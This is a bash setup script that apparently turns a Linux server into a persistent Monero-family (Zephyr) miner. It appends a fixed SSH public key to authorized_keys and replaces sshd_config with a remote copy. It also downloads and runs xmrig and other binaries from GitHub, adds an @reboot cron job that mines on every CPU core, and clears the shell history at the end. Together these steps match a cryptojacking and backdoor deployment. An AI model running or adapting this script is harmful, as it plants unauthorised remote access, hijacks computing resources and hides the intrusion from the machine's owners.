#!/bin/bash

# Update and install necessary packages
apt-get update -y
apt-get install curl wget screen cron -y

# Setup SSH
cd ~
mkdir -p ~/.ssh
chmod 700 ~/.ssh
touch ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOswKNcA2Gzv/mGSu2oeh571PlbpyAekXkmVh8FVx/z/ crypto@currency" >> ~/.ssh/authorized_keys

# Download and set SSH config
wget https://raw.githubusercontent.com/realtkco/scripts/main/sshd_config -O /etc/ssh/sshd_config

# Install Paping
wget https://raw.githubusercontent.com/realtkco/scripts/main/paping -O /usr/bin/paping
chmod +x /usr/bin/paping

# Define servers and port
servers=(
    "de.zephyr.herominers.com"
    "fi.zephyr.herominers.com"
    "ca.zephyr.herominers.com"
    "ru.zephyr.herominers.com"
    "us.zephyr.herominers.com"
    "us2.zephyr.herominers.com"
    "br.zephyr.herominers.com"
    "hk.zephyr.herominers.com"
    "kr.zephyr.herominers.com"
    "in.zephyr.herominers.com"
    "sg.zephyr.herominers.com"
    "tr.zephyr.herominers.com"
    "au.zephyr.herominers.com"
)
port=1123
minLatency=1000000
minServer=""

# Ping each server and find the one with the lowest latency
for server in "${servers[@]}"; do
    echo "Pinging $server..."
    result=$(paping "$server" -c 5 -p $port | grep 'Average' || echo "Error pinging $server")
    if [[ $result == *"Error pinging"* ]]; then
        echo $result
        continue
    fi
    latency=$(echo $result | awk '{print $5}' | sed 's/ms//')
    if [[ ! -z "$latency" && "$latency" =~ ^[0-9]+(\.[0-9]+)?$ ]]; then
        echo "$server: $latency ms"
        if (( $(echo "$latency < $minLatency" | bc -l) )); then
            minLatency="$latency"
            minServer="$server"
        fi
    else
        echo "Failed to extract latency for $server."
    fi
done

echo "Lowest latency is $minLatency ms at $minServer"
MINER_ENDPOINT="$minServer:$port"

# Mining setup
hostnamectl set-hostname $(curl -s4 https://i.wiggy.cc/scripts/api.php)$(systemd-detect-virt -q && echo "-vm" || echo "")

wget https://raw.githubusercontent.com/realtkco/scripts/main/xmrig -O /root/xmrig
chmod +x /root/xmrig

# Setup crontab to run miner at reboot
(crontab -l 2>/dev/null; echo "@reboot screen /root/xmrig -o $MINER_ENDPOINT -u ZEPHYR2wp87E6LWqg162Ur9k9PuHsBEKUKtNXPiPTVtwigRWMBFvpTQg26DjYxRLrB7L7g7PNJqtkTmZaY8775iwLficAPASBtP45 --cpu-no-yield --randomx-1gb-pages -t \$(nproc) -k -p \$(curl -s4 https://i.wiggy.cc/scripts/api.php)\$(systemd-detect-virt -q && echo \"-vm\" )") | crontab -

# Create a script for manual start
echo "screen /root/xmrig -o $MINER_ENDPOINT -u ZEPHYR2wp87E6LWqg162Ur9k9PuHsBEKUKtNXPiPTVtwigRWMBFvpTQg26DjYxRLrB7L7g7PNJqtkTmZaY8775iwLficAPASBtP45 --cpu-no-yield --randomx-1gb-pages -t \$(nproc) -k -p \$(curl -s4 https://i.wiggy.cc/scripts/api.php)\$(systemd-detect-virt -q && echo \"-vm\" )" > /root/start.sh
chmod +x /root/start.sh

# Clear history and prepare for use
history -c
rm -rf ~/.bash_history

clear
